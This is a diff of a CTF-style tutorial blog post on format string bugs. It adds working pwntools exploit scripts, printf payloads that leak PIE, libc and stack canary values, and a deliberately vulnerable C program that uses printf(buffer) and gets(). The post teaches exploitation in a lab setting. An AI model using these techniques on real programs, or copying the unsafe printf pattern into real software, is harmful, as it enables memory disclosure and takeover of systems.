@@ -1,18 +1,20 @@
 ---
 title: A Definitive Guide to Format String Bug
 date: '2024-02-29'
-tags: ['ctf-techs', 'fsb', 'format-string', 'printf']
+tags: ['ctf-techs', 'fsb', 'format-string', 'printf', 'pwn', 'guides']
 draft: false
 summary: A detailed guide on how printf's can be used for arbitrary read and arbitrary write.
 ---
 
 ## Introduction
 
-In this guide, I'll be explaining intricate details of Format String Bugs, how they occur, how they work and how they can be exploited to read values , write values to an arbitrary location and get a shell. This blog post will go in-depth to make sure that we fully understand each concept as we go through them.
+When I was learning about FSB's, I found an overwhelming amount of content that had detailed writeups, but none really answered the basic questions that I had in mind. Debugging FSBs for me was hard; especially when I was new to pwn. So, to answer all those questions that I had, I'm writing the detailed guide.
+
+In this guide, I'll be explaining intricate details of Format String Bugs, how they occur, how they work and how they can be exploited to read and write values to an arbitrary location and get a shell. This blog post will go in-depth to make sure that we fully understand each concept as we go through them.
 
 ## Table of Contents
 
-1. **[What is a Format String](#what-is-a-format-string-and-printf)**
+1. **[What is a Format String](#what-is-a-format-string)**
     - **[Specifier](#specifiers)**
         - **[Length sub-specifier](#length-sub-specifier)**
         - **[Position sub-specifier](#position-sub-specifier)**
@@ -23,12 +25,13 @@ In this guide, I'll be explaining intricate details of Format String Bugs, how t
 4. **[Arbitrary Read](#arbitrary-read)**
     - [From the stack](#from-the-stack)
     - [From an address](#from-an-address)
-    - [Bypassing PIE/ASLR/NX](#bypassing-pieaslrnx)
-5. **[Arbitrary Write](#arbitrary-write)**
+        - [Identifying the format string start offset](#identifying-the-format-string-start-offset)
+    - [Leaking PIE/ASLR/Canaries](#leaking-pieaslrcanaries)
+5. [Debugging FSB](#debugging-a-fsb)
+6. **[Arbitrary Write](#arbitrary-write)**
     - [To an address](#to-an-address)
     - [Overwriting GOT Entries](#overwriting-entries-on-the-global-offset-table)
     - [Writing a ROP Chain](#writing-a-rop-chain-using-fsb)
-6. **[Debugging FSB](#debugging-fsb)**
 7. **[Pwntools and other tools](#pwntools-and-other-tools)**
 
 ---
@@ -366,7 +369,7 @@ Now, we can see that, we're given the address of `flag`, and we need to leak the
 1. Writing address before our format string
 2. Writing address after our format string
 
-Now, the first one is most often used, however, the problem with that approach is, if `printf` encounters a NULL-byte, the format string won't execute. Meaning, let's say, flag was at address `0x404000`, then; in that scenario, if we actually passed the address before the format string, the `printf` would stop on getting that `0x00`. Therefore, we often write after our format string, but for the sake of this guide, i'll explain both.
+Now, the first one is most often used, however, the problem with that approach is, if `printf` encounters a NULL-byte, the format string won't execute. Meaning, let's say, flag was at address `0x404000`, then; in that scenario, if we actually passed the address before the format string, the `printf` would stop on getting that `0x00`. Therefore, we often write after our format string. Now, since the address passed to us in this example is `6 bytes` long, if we add `00` before it, our printf will only display the address and won't execute the format string therefore, we'll keep our focus on writing the address after our format string.
 
 Before writing, we need to do one important thing:
 
@@ -394,9 +397,338 @@ Who are you? AAAAAAAA|%6$p
 AAAAAAAA|0x4141414141414141
 ```
 
+#### Writing the address after our string
 
+Now, before moving forwards, let's write a simple `exploit.py`, that will extract the leaked address:
 
-### Bypassing PIE/ASLR/NX
+```py:exploit-fsb-address-read.py
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.terminal = ["tmux", "splitw", "-h"]
+io = process("./fsb-address-read")
+if args.GDB: gdb.attach(io, "b *main")
+
+io.recvuntil(b": ")
+leak = int(io.recvline(), 16)
+info("Flag is at: %#x" % leak)
+io.interactive()
+```
+
+Now, we have a boilerplate code ready for us. Next, we need to start writing a payload. So, firstly, we know that `%6` is the position where our input starts. So, what we need to do:
+
+- Write the address of `flag` on to the stack.
+- Dereference the position where the data was written on the stack.
+
+So, let's see since we'll write the address after the format string (to avoid breaking of printf on NULLs), let's firstly craft our format string. We know, that, we'll want to reference a value from an address that'll be stored on the stack. So, the address will be `8` bytes. Let's also take into account that; `%6$s`, will also be written on to the stack. Adding those two up, `8+4` (4 is `'%6$s'`'s length), i.e. 12. But, we know that addresses stored on the stack are offset by 8. So, we need to pad our payload so that it's length becomes divisible by 8. So, the payload can look something like this:
+
+```py
+payload = b"%6$s||||" + p64(leak)
+```
+
+> | here represents padding, you can whatever you like instead of this.
+
+Now, one thing we need to understand here. The first value was referenced using `%6`. But, if we do a mental map, following data will be stored on the stack:
+
+```hex:stack
+rsp ...
+rsp+6 : %6$s|||| : 0x7c7c7c7c70243620
+rsp+7 : leak : 0x0000000000404080
+```
+
+Now, if we were to `%6$s`, instead of leaking the value of `0x404080`, the value on 6th address will be `0x7c7c7c7c70243625`, and this will cause the program to crash. We can confirm this by using GDB.
+
+![alt text](/static/ctf-techs/image.png)
+
+and if we check the value currently stored at rdi:
+
+![alt text](/static/ctf-techs/image-1.png)
+
+So, in order to read the value, we'll read the 7th offset, instead of the 6th:
+
+![alt text](/static/ctf-techs/image-2.png)
+
+Therefore, the final exploit becomes:
+
+#### fsb-address-read exploit
+
+```py:exploit-fsb-address-read.py
+#!/usr/bin/env python3
+
+from pwn import *
+
+io = process("./fsb-address-read")
+io.recvuntil(b": ")
+leak = int(io.recvline(), 16)
+info("Flag is at: %#x" % leak)
+payload = b"%7$s||||" + p64(leak)
+io.sendline(payload)
+io.interactive()
+```
+
+### Leaking PIE/ASLR/Canaries
+
+The whole idea behind PIE, ASLR and Canaries is the randomness to ensure that on each launch, the value change, whether it be the base of the binary (in case of PIE), the load address of library (in case of ASLR), or the stack canary. Format String Bug is such an amazing bug that allows to leak the address from the stack. These addresses may belong to the binary, the libc or may very well be the canary.
+
+Why these leaks may be important, you might ask. Well, in case of PIE and ASLR, the binary is loaded into memory at a random address. However, the difference between the base of the loaded binary and a function (let's say `printf`), is always constant. So, if we somehow get a leak, we can calculate the distance from a certain base (loaded in memory at the time of leak) and we can easily get the offset, that will always ensure that we a leak of a known offset in memory.
+
+To fully understand this, let's take the following example:
+
+Let's say, that on launch of a program, libc is loaded at: `0x7ffcf85dd000`, and puts is located at `0x7ffcf85de420`. Now, using a format string let's say `%16$p`, we are able to leak the value of `puts`, that came out to be `0x7ffcf85dd420`. Now, for me to find a constant offset everytime, what I can do, is simply subtract the leak that I got, with the base of libc. i.e. `0x7ffcf85de420-0x7ffcf85dd000`, and I got the answer: `0x1420`. Now, the thing is, whenever I leak the value using `%16$p`, I can easily find the base of libc, by simply doing `leak-0x1420` and the answer will always result in the base of libc. This exact technique can be used to find the `PIE-base` of binaries.
+
+In case of canaries, we can also simply leak them using a format strings. One question that I had was `How do I know what's the canary?`. Well, in `pwndbg`, we have a command called `canary` that will simply list the canary. Another easier gimmick is; all canaries end with `00`, so, one the stack, we can keep an eye out for numbers that end with `00`.
+
+Let's consider the following program:
+
+```c:fsb-leaks.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    char buffer[0x100];
+    printf("What is your name? ");
+    fgets(buffer, 0x100, stdin);
+    printf(buffer);
+
+    printf("Is it really your name? ");
+    gets(buffer);
+
+    return 0;
+}
+```
+
+Now, we'll compile this program with all mitigations:
+
+```bash
+gcc -o fsb-leaks fsb-leaks.c -w
+```
+
+> We will get a linker warning, that is because we're using `gets`, so we can just ignore that.
+
+I've already wrote a writeup in which I explain in greate detail about how you can leak libc values and find the base. You can read about it [here](/blog/writeups/blackhatmea23-quals/pwn/Profile#leaking-the-libc-address-using-the-fsb-vulnerability)
+
+Now, let's run the binary in GDB and start leaking values.
+
+![alt text](/static/ctf-techs/image-13.png)
+
+Now, here, we will first press `CTRL+C`, to break the program and enter GDB and then, we'll type `vmmap` to find out the virtual memory mapping of this:
+
+![alt text](/static/ctf-techs/image-14.png)
+
+Here we can see that, the PIE-base is `0x555555554000` and ends at `0x555555559000`, so any leaks between this range will give us PIE-leak. Similarly, `0x7ffff7db7000` to `0x7ffff7fa5000` is the address range of libc.
+
+> NOTE: In GDB, we have ASLR off, so we'll always get the same addresses.
+
+Looking back at the data we got:
+
+```txt:stdout
+What is your name? %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.                                                         
+0x5555555596b1.(nil).0x5555555596f3.0x7fffffffd590.0x7c.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x340000a2e70.0x34000000340.(nil).0x100.(nil).(nil).(nil).(nil).(nil).
+```
+
+The first leaked address can be seen that might belong to the `pie`, however, you can see that `9b61` doesn't belong to the pie range of `0x....4000` to `9000`. Therefore, let's try and leak more values.
+
+For this purpose, I made a simple command line utility in python that can generate format string patterns for us. You can take a look at in my [gist](https://gist.github.com/TheFlash2k/2ee4650c3fc850caceb558ef82fa9bd6)
+
+Since, in the last payload, we leaked 22 values from the stack, let's leak 22 more, starting from 23. We can generate a simple payload using my script:
+
+```bash
+$ fmt-generator -s 23 -a 22 --with-index
+```
+
+This generated the following payload:
+
+```txt:stdout
+|23=%23$p|24=%24$p|25=%25$p|26=%26$p|27=%27$p|28=%28$p|29=%29$p|30=%30$p|31=%31$p|32=%32$p|33=%33$p|34=%34$p|35=%35$p|36=%36$p|37=%37$p|38=%38$p|39=%39$p|40=%40$p|41=%41$p|42=%42$p|43=%43$p|44=%44$p|45=%45$p
+```
+
+Now, let's pass this input to our program once again in GDB. The output we got is:
+
+```txt:stdout-gdb
+What is your name? |23=%23$p|24=%24$p|25=%25$p|26=%26$p|27=%27$p|28=%28$p|29=%29$p|30=%30$p|31=%31$p|32=%32$p|33=%33$p|34=%34$p|35=%35$p|36=%36$p|37=%37$p|38=%38$p|39=%39$p|40=%40$p|41=%41$p|42=%42$p|43=%43$p|44=%44$p|45=%45$p
+|23=0x70243833253d3833|24=0x243933253d39337c|25=0x3034253d30347c70|26=0x34253d31347c7024|27=0x253d32347c702431|28=0x3d33347c70243234|29=0x34347c7024333425|30=0x347c70243434253d|31=0xa70243534253d35|32=0x7fffffffd600|33=0x55555555529d|34=0x7ffff7fa82e8|35=0x555555555250|36=(nil)|37=0x5555555550c0|38=0x7fffffffd790|39=0x9b65a96d8a91da00|40=(nil)|41=0x7ffff7ddb083|42=0x7ffff7ffc620|43=0x7fffffffd798|44=0x100000000|45=0x5555555551a9
+Is it really your name?
+```
+
+Now, in this output, we see quite a lot of values that will be helpful for us. Firstly, we can see that at index `33`, we have an PIE leak, same at `35`, `37`, and `45`. Let's consider the value at index `33`. In gdb, we can use `xinfo <address>` command to find the exact offset from the base. So, in our case: `xinfo 0x55555555529d` gives us:
+
+![alt text](/static/ctf-techs/image-15.png)
+
+We can see that, the difference from the leak address to the base is `0x129d`. So, whenever we'll do `%33$p` and if we subtract `0x129d` from the leaked value, we can get the base of the binary.
+
+In the above output, we got another juicy value i.e. the `canary`, where; you might ask. Well, like I told you before, canary values often end in `00`, so; if we look at `39` index, we can see: `39=0x9b65a96d8a91da00`. Let's confirm if this is the canary using GDB:
+
+![alt text](/static/ctf-techs/image-16.png)
+
+Perfect, and lastly, we also got a libc leak, looking closely at index `41`. We can see `41=0x7ffff7ddb083` which corresponds to the range that we analyzed before. So, similar to pie, let's find the offset of the leak with base using `xinfo 0x7ffff7ddb083` command:
+
+![alt text](/static/ctf-techs/image-17.png)
+
+We can see that the offset is `0x24083`. So, to sum up, we can simply leak all three values using a single payload, i.e:
+
+```py
+payload = b"|%33$p|%39$p|%41$p|"
+```
+
+And then upon each leak, we can parse accordingly, a small exploit for parsing these values look something like:
+
+```py:exploit-fsb-leaks.py
+#!/usr/bin/env python3
+
+from pwn import *
+
+elf = context.binary = ELF("./fsb-leaks")
+libc = elf.libc
+io = process()
+
+payload = b"|%33$p|%39$p|%41$p|"
+io.sendline(payload)
+
+leaks = io.recvline().split(b'|')[1:-1]
+pieleak = int(leaks[0], 16)
+canary = int(leaks[1], 16)
+libc_leak = int(leaks[2], 16)
+
+elf.address = pieleak - 0x129d
+libc.address = libc_leak - 0x24083
+
+print("Pie Base : %#x" % elf.address)
+print("Canary   : %#x" % canary)
+print("Libc Base: %#x" % libc.address)
+
+# do the rest of the exploit here....
+```
+
+Running this on the binary without GDB to ensure that ASLR is on:
+
+![alt text](/static/ctf-techs/image-18.png)
+
+We can be sure if we have the base of PIE/LIBC if the last three nibbles end in 0.
+
+## Debugging a FSB
+
+When I was learning FSB's, One of the hardest things for me was debugging and finding out exactly where my payload was messing up and how I could fix it. If you're stuck at a similar position, I'll try my best to explain this concept to you in detail.
+
+For this demonstration, I'll use [this](#from-an-address) source code. Now, in the [exploit](#fsb-address-read-exploit) that we wrote for reading data from an address, we made a mental map and understood that we had to `pad` in order to get the value into the next address. Instead of a mental map, let's use GDB.
+Firstly, we must identify, at which point we must break and analyze the values in stack/registers. For that, let's simply: `disass main`:
+
+![alt text](/static/ctf-techs/image-3.png)
+
+Now, we can see that:
+
+```hex
+0x0000000000401292 <+114>:   call   0x4010b0 <printf@plt>
+```
+
+Is the call to printf that we're looking for. How did I come to know that this is the printf call that I'm looking for?
+
+```hex
+   0x0000000000401286 <+102>:   lea    rax,[rbp-0x70]
+   0x000000000040128a <+106>:   mov    rdi,rax
+```
+
+In this scenario, whatever that I'm inputting is stored at `rbp-0x70`. And, that data is being loaded into `rax`, and then passed in as the first argument `printf`.
+
+Now, in order to set breakpoint in gdb, we use `b *<ADDRESS>`. So, we can either use: `b *0x0000000000401292` or using function relative offsets: `b *main+114`. We'll write an exploit in pwntools that will automatically attach GDB to it. And, instead of using a working payload, we'll use the first crafted payload i.e. `%6$s`
+
+```py:exploit-debugging.py
+#!/usr/bin/env python3
+
+from pwn import *
+
+context.terminal = ["tmux", "splitw", "-h"]
+io = process("./fsb-address-read")
+if args.GDB: gdb.attach(io, "b *main+114") # adding the gdb breakpoint here.
+io.recvuntil(b": ")
+leak = int(io.recvline(), 16)
+info("Flag is at: %#x" % leak)
+payload = b"%6$s" + p64(leak)
+io.sendline(payload)
+io.interactive()
+```
+
+Now, in order to run this, we need to run it as:
+
+```bash:Terminal
+$ tmux
+# NOTE: tmux is a must, if you don't want to use tmux, remove the `context.terminal` line from the exploit and run the command:
+$ python3 exploit-debugging.py GDB
+```
+
+Now, once we have the gdb pane in tmux, we need to press `c` to continue our execution.
+
+![alt text](/static/ctf-techs/image-4.png)
+
+Now, we can see that:
+
+```hex
+ ► 0x401292 <main+114>           call   printf@plt                      <printf@plt>
+        format: 0x7ffc5f332ca0 ◂— 0x40408073243625
+        vararg: 0xa      
+```
+
+The data at `0x7ffc5f332ca0` is `0x40408073243625`, which looks like a mixture of the address i.e. `0x404080` and our format string. Let's analyze the data at the stack pointer:
+
+```gdb
+pwndbg> x/gx $rsp
+```
+
+![alt text](/static/ctf-techs/image-5.png)
+
+We can see more the next 10 bytes as well:
+
+```gdb
+pwndbg> x/10gx $rsp
+```
+
+![alt text](/static/ctf-techs/image-6.png)
+
+Now, we can clearly see that, the data being passed to `printf` is `0x0040408073243625` and our payload i.e. `%6$s`, will dereference this value, which will cause a segfault.
+
+Now, what we need to do, is move `0x404080` to the next address. How can we do that? The padding... We can see that, there are four bytes that; if added will move the flag-address to the next address. So, we'll add four characters for padding. Our payload will look something like this now:
+
+```py
+payload = b"%6$s||||" + p64(leak)
+```
+
+Now, when exploit is run with GDB:
+
+![alt text](/static/ctf-techs/image-7.png)
+
+Looking at the data in stack:
+
+```gdb
+pwndbg> x/10gx $rsp
+```
+
+![alt text](/static/ctf-techs/image-8.png)
+
+We can clearly see that:
+
+```h
+0x7ffd790e8360: 0x7c7c7c7c73243625      0x0000000000404080
+```
+
+`0x404080` is written to the next chunk in memory. Let's press `C` to continue the execution of this program.
+
+![alt text](/static/ctf-techs/image-9.png)
+
+We received a SEGFAULt, why? Remember, we offset `6`, but at the `6th` position, `0x7c7c7c7c73243625` exists. Therefore, we now need to offset `7` in order to make sure that we read the `7th` value from the stack. We can confirm this, by getting the value of `rdi` when the program crashed:
+
+```h
+ ► 0x7f15d681f947 <__strlen_avx2+71>     vpcmpeqb ymm1, ymm0, ymmword ptr [rdi]
+```
+
+```gdb
+pwndbg> p/x $rdi
+```
+
+![alt text](/static/ctf-techs/image-10.png)
+
+This confirms what we said earlier. Now, if we change the payload to reference `7th` value, instead of `6th`, we get the flag.
+
+Using these exact same techniques, we can debug write-fsbs.
 
 ## Arbitrary Write
 
@@ -405,7 +737,5 @@ AAAAAAAA|0x4141414141414141
 ### Overwriting Entries on the Global Offset Table
 
 ### Writing a ROP Chain using FSB
-
-## Debugging FSB
 
 ## Pwntools and other tools
